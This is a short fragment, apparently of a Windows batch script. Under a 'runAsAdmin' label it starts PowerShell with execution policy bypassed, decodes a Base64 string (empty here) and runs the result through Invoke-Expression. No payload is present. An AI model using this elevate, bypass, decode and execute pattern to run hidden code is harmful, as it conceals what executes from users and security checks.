...
:runAsAdmin
    ...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$de = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('')); Invoke-Expression $de"
    endlocal
    exit